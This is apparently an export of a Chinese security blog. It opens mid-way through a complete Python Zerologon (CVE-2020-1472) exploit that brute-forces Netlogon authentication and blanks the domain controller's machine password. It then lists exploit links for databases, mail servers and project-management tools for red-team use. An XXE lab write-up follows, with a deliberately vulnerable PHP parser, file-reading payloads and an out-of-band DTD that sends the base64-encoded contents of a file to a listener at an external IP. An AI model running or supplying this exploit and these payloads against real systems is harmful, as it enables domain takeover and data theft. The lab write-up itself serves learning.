impacket.dcerpc.v5 <span class="keyword">import</span> nrpc, epm</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.dtypes <span class="keyword">import</span> NULL</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5 <span class="keyword">import</span> transport</span><br><span class="line"><span class="keyword">from</span> impacket <span class="keyword">import</span> crypto</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hmac, hashlib, struct, sys, socket, time</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_call</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.</span></span><br><span class="line">MAX_ATTEMPTS = <span class="number">2000</span> <span class="comment"># False negative chance: 0.04%</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fail</span><span class="params">(msg)</span>:</span></span><br><span class="line">print(msg, file=sys.stderr)</span><br><span class="line">print(<span class="string">'This might have been caused by invalid arguments or network issues.'</span>, file=sys.stderr)</span><br><span class="line">sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_zero_authenticate</span><span class="params">(dc_handle, dc_ip, target_computer)</span>:</span></span><br><span class="line"><span class="comment"># Connect to the DC's Netlogon service.</span></span><br><span class="line">binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol=<span class="string">'ncacn_ip_tcp'</span>)</span><br><span class="line">rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()</span><br><span class="line">rpc_con.connect()</span><br><span class="line">rpc_con.bind(nrpc.MSRPC_UUID_NRPC)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use an all-zero challenge and credential.</span></span><br><span class="line">plaintext = <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line">ciphertext = <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.</span></span><br><span class="line">flags = <span class="number">0x212fffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Send challenge and authentication request.</span></span><br><span class="line">nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + <span class="string">'\x00'</span>, target_computer + <span class="string">'\x00'</span>, plaintext)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + <span class="string">'\x00'</span>, target_computer + <span class="string">'$\x00'</span>, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + <span class="string">'\x00'</span>, ciphertext, flags)</span><br><span class="line"></span><br><span class="line"><span class="comment"># It worked!</span></span><br><span class="line"><span class="keyword">assert</span> server_auth[<span class="string">'ErrorCode'</span>] == <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> rpc_con</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> nrpc.DCERPCSessionError <span class="keyword">as</span> ex:</span><br><span class="line"><span class="comment"># Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.</span></span><br><span class="line"><span class="keyword">if</span> ex.get_error_code() == <span class="number">0xc0000022</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">fail(<span class="string">f'Unexpected error code from DC: <span class="subst">&#123;ex.get_error_code()&#125;</span>.'</span>)</span><br><span class="line"><span class="keyword">except</span> BaseException <span class="keyword">as</span> ex:</span><br><span class="line">fail(<span class="string">f'Unexpected error: <span class="subst">&#123;ex&#125;</span>.'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">perform_attack</span><span class="params">(dc_handle, dc_ip, target_computer)</span>:</span></span><br><span class="line"><span class="comment"># Keep authenticating until succesfull. Expected average number of attempts needed: 256.</span></span><br><span class="line">print(<span class="string">"[!] CVE-2020-1472 PoC by BlackArrow (Tarlogic)\n"</span>)</span><br><span class="line">print(<span class="string">'Performing authentication attempts...'</span>)</span><br><span class="line">rpc_con = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> attempt <span class="keyword">in</span> range(<span class="number">0</span>, MAX_ATTEMPTS):</span><br><span class="line">rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rpc_con == <span class="literal">None</span>:</span><br><span class="line">print(<span class="string">'='</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rpc_con:</span><br><span class="line">print(<span class="string">'\nSuccess! DC can be fully compromised by a Zerologon attack. (attempt=&#123;&#125;)'</span>.format(attempt))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'\nAttack failed. Target is probably patched.'</span>)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> rpc_con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_authenticator</span><span class="params">(cred=<span class="string">b'\x00'</span> * <span class="number">8</span>)</span>:</span></span><br><span class="line">authenticator = nrpc.NETLOGON_AUTHENTICATOR()</span><br><span class="line">authenticator[<span class="string">'Credential'</span>] = cred</span><br><span class="line">authenticator[<span class="string">'Timestamp'</span>] = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> authenticator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetrServerPasswordSet2</span><span class="params">(NDRCALL)</span>:</span></span><br><span class="line">opnum = <span class="number">30</span></span><br><span class="line">structure = (</span><br><span class="line">(<span class="string">'PrimaryName'</span>, PLOGONSRV_HANDLE),</span><br><span class="line">(<span class="string">'AccountName'</span>, WSTR),</span><br><span class="line">(<span class="string">'SecureChannelType'</span>, NETLOGON_SECURE_CHANNEL_TYPE),</span><br><span class="line">(<span class="string">'ComputerName'</span>, WSTR),</span><br><span class="line">(<span class="string">'Authenticator'</span>, NETLOGON_AUTHENTICATOR),</span><br><span class="line">(<span class="string">'ClearNewPassword'</span>, NL_TRUST_PASSWORD),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetrServerPasswordSet2Response</span><span class="params">(NDRCALL)</span>:</span></span><br><span class="line">structure = (</span><br><span class="line">(<span class="string">'ReturnAuthenticator'</span>, NETLOGON_AUTHENTICATOR),</span><br><span class="line">(<span class="string">'ErrorCode'</span>, NTSTATUS),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passwordSet2</span><span class="params">(rpc_con, dc_name, target_account)</span>:</span></span><br><span class="line">dce = rpc_con</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dce <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">request = NetrServerPasswordSet2()</span><br><span class="line">request[<span class="string">'PrimaryName'</span>] = dc_name + <span class="string">'\x00'</span></span><br><span class="line">request[<span class="string">'AccountName'</span>] = target_account + <span class="string">'\x00'</span></span><br><span class="line">request[<span class="string">'SecureChannelType'</span>] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel</span><br><span class="line">request[<span class="string">'ComputerName'</span>] = dc_name + <span class="string">'\x00'</span></span><br><span class="line">request[<span class="string">'Authenticator'</span>] = get_authenticator()</span><br><span class="line"></span><br><span class="line">clear = NL_TRUST_PASSWORD()</span><br><span class="line">clear[<span class="string">'Buffer'</span>] = <span class="string">b'\x00'</span> * <span class="number">516</span></span><br><span class="line">clear[<span class="string">'Length'</span>] = <span class="string">'\x00'</span> * <span class="number">4</span></span><br><span class="line">request[<span class="string">'ClearNewPassword'</span>] = clear</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">print()</span><br><span class="line">resp = dce.request(request)</span><br><span class="line">resp.dump()</span><br><span class="line">print(<span class="string">"[+] CVE-2020-1472 exploited\n"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">raise</span></span><br><span class="line">dce.disconnect()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">3</span> &lt;= len(sys.argv) &lt;= <span class="number">4</span>):</span><br><span class="line">print(<span class="string">'Usage: CVE-2020-1472.py &lt;nbios-name&gt; &lt;computer&gt; &lt;dc-ip&gt;\n'</span>)</span><br><span class="line">print(<span class="string">'Performs the Zerologon attack and resets the computer password of the domain controller.'</span>)</span><br><span class="line">print(<span class="string">'Note: nbios-name should be the (NetBIOS) computer name of the domain controller.'</span>)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">[_, nbios_name, computer, dc_ip] = sys.argv</span><br><span class="line"></span><br><span class="line">nbios_name = nbios_name.rstrip(<span class="string">'$'</span>)</span><br><span class="line">rpc_con = perform_attack(<span class="string">'\\\\'</span> + nbios_name, dc_ip, nbios_name)</span><br><span class="line"></span><br><span class="line">passwordSet2(rpc_con, nbios_name, computer)</span><br><span class="line"></span><br><span class="line">rpc_con.disconnect()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://mp.weixin.qq.com/s/MagXtN1hfNPTQdcIMDOZEA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/MagXtN1hfNPTQdcIMDOZEA</a></p><p><a href="https://github.com/blackarrowsec/redteam-research" target="_blank" rel="noopener">https://github.com/blackarrowsec/redteam-research</a> </p><p><a href="https://www.cnblogs.com/forforever/p/13682344.html" target="_blank" rel="noopener">https://www.cnblogs.com/forforever/p/13682344.html</a> </p><p><a href="https://mp.weixin.qq.com/s/f1f1nGSMdEXJL3lY7FCMMw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/f1f1nGSMdEXJL3lY7FCMMw</a> </p><p><a href="https://www.cnblogs.com/forforever/p/13682344.html" target="_blank" rel="noopener">https://www.cnblogs.com/forforever/p/13682344.html</a></p><h4 id="2、永恒之蓝-MS17-17010"><a href="#2、永恒之蓝-MS17-17010" class="headerlink" title="2、永恒之蓝 MS17-17010"></a>2、永恒之蓝 MS17-17010</h4><p>内网刷分的利器</p><h2 id="六、数据库"><a href="#六、数据库" class="headerlink" title="六、数据库"></a>六、数据库</h2><h4 id="1、redis"><a href="#1、redis" class="headerlink" title="1、redis"></a>1、redis</h4><p><a href="https://xz.aliyun.com/t/256" target="_blank" rel="noopener">Redis未授权访问漏洞利用总结</a><br><a href="https://xz.aliyun.com/t/5616" target="_blank" rel="noopener">Redis 4.x RCE</a><br><a href="https://www.webshell.cc/5154.html" target="_blank" rel="noopener">redis利用姿势收集</a><br><a href="https://sploitus.com/?query=redis#exploits" target="_blank" rel="noopener">Redis历史漏洞合集</a></p><h4 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h4><p><a href="https://www.cnblogs.com/junsec/p/11390634.html" target="_blank" rel="noopener">Hadoop Yarn REST API未授权漏洞利用</a></p><h4 id="3、mysql"><a href="#3、mysql" class="headerlink" title="3、mysql"></a>3、mysql</h4><p><a href="https://xz.aliyun.com/t/1122" target="_blank" rel="noopener">Mysql提权(CVE-2016-6663、CVE-2016-6664组合实践)</a><br><a href="https://xz.aliyun.com/t/1" target="_blank" rel="noopener">Mysql数据库渗透及漏洞利用总结</a><br><a href="https://www.lshack.cn/596/" target="_blank" rel="noopener">Mysql 注入专辑</a><br><a href="https://www.cnblogs.com/muxueblog/p/13043768.html" target="_blank" rel="noopener">PhpMyadmin的几种getshell方法</a><br><a href="https://xz.aliyun.com/t/2199" target="_blank" rel="noopener">高版本MySQL之UDF提权</a><br><a href="https://sploitus.com/?query=mysql#exploits" target="_blank" rel="noopener">Mysql历史漏洞合集</a></p><h4 id="4、Mssql"><a href="#4、Mssql" class="headerlink" title="4、Mssql"></a>4、Mssql</h4><p><a href="https://forum.ywhack.com/thread-114737-1-1.html" target="_blank" rel="noopener">Mssql利用姿势整理(史上最全)</a><br><a href="https://xz.aliyun.com/t/7534" target="_blank" rel="noopener">Mssql数据库命令执行总</a><br><a href="https://xz.aliyun.com/t/8195" target="_blank" rel="noopener">利用mssql模拟登录提权</a><br><a href="https://xz.aliyun.com/t/8513" target="_blank" rel="noopener">高级的MSSQL注入技巧</a><br><a href="https://xz.aliyun.com/t/6682" target="_blank" rel="noopener">MSSQL使用CLR程序集来执行命令</a></p><h4 id="5、Nosql"><a href="#5、Nosql" class="headerlink" title="5、Nosql"></a>5、Nosql</h4><p><a href="https://www.chainnews.com/articles/094943717085.htm" target="_blank" rel="noopener">NoSql 数据库之漏洞利用方法总结</a></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="七、邮件"><a href="#七、邮件" class="headerlink" title="七、邮件"></a>七、邮件</h2><p>参考：<a href="https://mp.weixin.qq.com/s/wiZJUQ6Un9UuE98YFBYWig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wiZJUQ6Un9UuE98YFBYWig</a></p><h4 id="1、Exchange"><a href="#1、Exchange" class="headerlink" title="1、Exchange"></a>1、Exchange</h4><p><a href="https://srcincite.io/advisories/src-2020-0025/" target="_blank" rel="noopener">CVE-2020-17083 Microsoft Exchange Server 远程执行代码漏洞</a></p><p><a href="https://github.com/rapid7/metasploit-framework/pull/14126" target="_blank" rel="noopener">Microsoft Exchange远程代码执行漏洞（CVE-2020-16875）</a></p><p><a href="https://xz.aliyun.com/t/7321" target="_blank" rel="noopener">CVE-2020-0688_微软EXCHANGE服务的远程代码执行漏洞</a></p><p><a href="https://xz.aliyun.com/t/3670" target="_blank" rel="noopener">Microsoft Exchange任意用户伪造漏洞</a></p><p><a href="https://sploitus.com/?query=Exchange#exploits" target="_blank" rel="noopener">Exchange 历史漏洞合集</a></p><h4 id="2、coremail"><a href="#2、coremail" class="headerlink" title="2、coremail"></a>2、coremail</h4><p><a href="https://www.lsablog.com/networksec/penetration/coremail-info-leakage-and-webservice-unauthorization-reproduce/" target="_blank" rel="noopener">coremail 配置信息泄露及接口未授权漏洞</a></p><p><a href="https://www.seebug.org/vuldb/ssvid-94754" target="_blank" rel="noopener">Coremail的存储型XSS漏洞</a></p><p><a href="https://sploitus.com/?query=Coremail#exploits" target="_blank" rel="noopener">Coremail 历史漏洞合集</a></p><h2 id="八、项目管理"><a href="#八、项目管理" class="headerlink" title="八、项目管理"></a>八、项目管理</h2><h4 id="1、禅道"><a href="#1、禅道" class="headerlink" title="1、禅道"></a>1、禅道</h4><p><a href="https://blog.csdn.net/qq_36197704/article/details/109385695" target="_blank" rel="noopener">CNVD-C-2020-121325 禅道开源版文件上传漏洞</a></p><p><a href="https://xz.aliyun.com/t/171/" target="_blank" rel="noopener">禅道9.1.2 免登陆SQL注入漏洞</a></p><p><a href="https://www.cnblogs.com/ly584521/p/13962816.html" target="_blank" rel="noopener">禅道 ≤ 12.4.2 后台管理员权限Getshell</a></p><p><a href="https://xz.aliyun.com/t/186" target="_blank" rel="noopener">禅道9.1.2 权限控制逻辑漏洞</a></p><p><a href="https://xz.aliyun.com/t/188" target="_blank" rel="noopener">禅道826版本一定条件getshell</a></p><p><a href="https://anquan.baidu.com/article/996" target="_blank" rel="noopener">禅道远程代码执行漏洞</a></p><p><a href="http://dwz.date/d2G5" target="_blank" rel="noopener">禅道11.6任意文件读取</a></p><h4 id="2、Jira"><a href="#2、Jira" class="headerlink" title="2、Jira"></a>2、Jira</h4><p><a href="https://caiqiqi.github.io/2019/11/03/Atlassian-Jira%E6%BC%8F%E6%B4%9E%E5%A4%A7%E6%9D%82%E7%83%A9/" target="_blank" rel="noopener">Atlassian Jira漏洞大杂烩</a></p><p><a href="https://cloud.tencent.com/developer/article/1529135" target="_blank" rel="noopener">Jira服务工作台路径遍历导致的敏感信息泄露漏洞（CVE-2019-14994）</a></p><p><a href="https://www.cnblogs.com/backlion/p/11608371.html" target="_blank" rel="noopener">Jira未授权SSRF漏洞(CVE-2019-8451)</a></p><p><a href="https://www.cnblogs.com/backlion/p/11608439.html" target="_blank" rel="noopener">Atlassian JIRA服务器模板注入漏洞（CVE-2019-11581）</a></p><p><a href="https://xz.aliyun.com/t/7219" target="_blank" rel="noopener">CVE-2019-8449 JIRA 信息泄漏漏洞</a></p><p><a href="https://sploitus.com/?query=Jira#exploits" target="_blank" rel="noopener">Jira历史漏洞合集</a></p><h2 id="更新说明："><a href="#更新说明：" class="headerlink" title="更新说明："></a>更新说明：</h2><p>[2021.1.21更新数据库、邮件、项目管理部分] 参考：<a href="https://mp.weixin.qq.com/s/wiZJUQ6Un9UuE98YFBYWig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wiZJUQ6Un9UuE98YFBYWig</a></p><p>[2020.10.27更新操作系统部分]</p>]]></content>
      
      
      <categories>
          
          <category> HW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="2020/09/02/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/09/02/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>之前巩固了XML相关的基础知识，现在温故下XXE（XML External Entity Injection，XML外部实体注入）漏洞。</p><p>跟着<a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞</a>来做实验。</p><p>本地实验环境：windows7；phpstudy；</p><h3 id="实验1：有回显读本地敏感文件："><a href="#实验1：有回显读本地敏感文件：" class="headerlink" title="实验1：有回显读本地敏感文件："></a><strong>实验1：有回显读本地敏感文件：</strong></h3><p>1.php：在服务能接收并解析 XML 格式的输入并回显</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    <span class="comment">// php://input 是个可以访问请求的原始数据的只读流。</span></span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="comment">// 从字符串加载为XML</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span></span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件放在www目录的xxe文件后访问如下：</p><p><img src="/imgs/image-20201010143120990.png" alt="image-20201010143120990"></p><p>用burp suite抓放，可以看到成功获取到文件内容</p><figure class="highlight xml"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/system.ini"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201010143254706.png" alt="image-20201010143254706"></p><p><strong>进阶</strong>：为了防止文件里面有特殊符号（&lt;&gt;/等）导致不能读取，使用CDATA来读取（CDATA 区段中的文本会被解析器忽略）</p><p><img src="/imgs/image-20201010150247697.png" alt="image-20201010150247697"></p><p>首先看下不做处理的效果</p><p><img src="/imgs/image-20201010150214693.png" alt="image-20201010150214693"></p><p>然后使用CDATA处理的payload</p><figure class="highlight xml"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/phpStudy/test.txt"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.116.140/xxe/evil.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtd，为了方便，我放在跟1.php同目录了</p><figure class="highlight plain"><figcaption><span>evil.dtd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>此时可以正常读取文件</p><p><img src="/imgs/image-20201010150030222.png" alt="image-20201010150030222"></p><h3 id="实验2：无回显读取本地敏感文件"><a href="#实验2：无回显读取本地敏感文件" class="headerlink" title="实验2：无回显读取本地敏感文件"></a>实验2：无回显读取本地敏感文件</h3><p>2.php</p><figure class="highlight php"><figcaption><span>2.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd，一般放在服务器能访问到的某个Web网站上，这里为了方便直接放在2.php同目录下了</p><figure class="highlight plain"><figcaption><span>test.dtd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;112.124.16.133:1389?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在远程服务器开启监听nc -lvp 1389，等待连接</p><p>抓放包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.116.140&#x2F;xxe&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201010155617522.png" alt="image-20201010155617522"></p><p>远程端口接收到连接，这个时候我们就获取到了base64编码过的文件内容</p><p><img src="/imgs/image-20201010155731526.png" alt="image-20201010155731526"></p><p>其实这个实验整个的思路就是我们通过payload的remote读取远程服务器上的test.dtd内容，引用test.dtd的int，再去调用send发送请求，通过操作获取本地服务器的文件并发送内容到我们的监听端口，这时候我们可以从监听端口获取信息，监听端口也可以是dnslog等。</p><h3 id="实验3和4：HTTP-内网主机-端口探测"><a href="#实验3和4：HTTP-内网主机-端口探测" class="headerlink" title="实验3和4：HTTP 内网主机/端口探测"></a>实验3和4：HTTP 内网主机/端口探测</h3><p>利用XXE漏洞探测内网，以存在XXE漏洞的服务器作为内网支点探测内网存活HTTP服务</p><p>还是用上面的2.php。如下图，探测<a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a> 当服务能访问通会返回Content error in the external subset in <a href="http://127.0.0.1/，如果是不存在的服务，将返回DOMDocument::loadXML()" target="_blank" rel="noopener">http://127.0.0.1/，如果是不存在的服务，将返回DOMDocument::loadXML()</a>: failed to load external entity &quot;<a href="http://127.0.0.1:66/" target="_blank" rel="noopener">http://127.0.0.1:66/</a>&quot;</p><p><img src="/imgs/image-20201015150509068.png" alt="image-20201015150509068"></p><p><img src="/imgs/image-20201015150709400.png" alt="image-20201015150709400"></p><p>我们可以根据返回结果来判定服务是否存在，利用intruder模块，</p><p><img src="/imgs/image-20201015150849429.png" alt="image-20201015150849429"></p><p><img src="/imgs/image-20201015151030931.png" alt="image-20201015151030931"></p><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a></p><p><a href="https://www.anquanke.com/post/id/197423" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197423</a></p><p><a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">https://xz.aliyun.com/t/2761</a></p>]]></content>
      
      
      <categories>
          
          <category> XML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML基础知识</title>
      <link href="2020/08/31/XML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>2020/08/31/XML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-XML基础知识"><a href="#0x00-XML基础知识" class="headerlink" title="0x00 XML基础知识"></a>0x00 XML基础知识</h2><p>XML主要被设计用于<strong>传输和存储数据。</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="comment">&lt;!--这里是声明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span><span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"CHILDREN"</span>&gt;</span><span class="comment">&lt;!--category="CHILDREN"属性--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="comment">&lt;!--&gt;PCDATA：Harry Potter。--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"> 